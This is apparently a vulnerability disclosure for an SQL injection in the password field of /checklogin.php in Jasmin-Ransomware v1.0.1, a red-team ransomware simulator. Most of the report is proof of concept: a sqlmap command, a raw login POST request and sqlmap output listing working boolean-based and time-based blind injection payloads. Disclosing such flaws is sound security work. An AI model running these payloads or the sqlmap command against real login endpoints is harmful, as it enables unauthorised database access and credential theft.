# SQLi vulnerability in Jasmin-Ransomware v1.0.1 of file /checklogin.php with param password

**vender**:

- Jasmin-Ransomware

**SoftLink**:

- [codesiddhant/Jasmin-Ransomware: Jasmin Ransomware is an advanced red team tool (WannaCry Clone) used for simulating real ransomware attacks. Jasmin helps security researchers to overcome the risk of external attacks.](https://github.com/codesiddhant/Jasmin-Ransomware)

**Vulnerable File**

- /checklogin.php

**Version**

- V1.0.1

### POC

```bash
sqlmap -r sqli.txt -p password--technique BT --batch
```



```http
POST /checklogin.php HTTP/1.1
Host: www.jasmin.top
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://www.jasmin.top/login.php
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=gqgdlhsu3r6nag12j87cfiq3m6
Priority: u=0
Origin: http://www.jasmin.top
Content-Length: 47

username=siddhant&password=123456&service=login
```



```
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=siddhant&password=123456' AND 9974=9974 AND 'WbgG'='WbgG&service=login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=siddhant&password=123456' AND (SELECT 7995 FROM (SELECT(SLEEP(5)))KTsc) AND 'vDHA'='vDHA&service=login
---
```



![image-20250531041335006](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505310413106.png)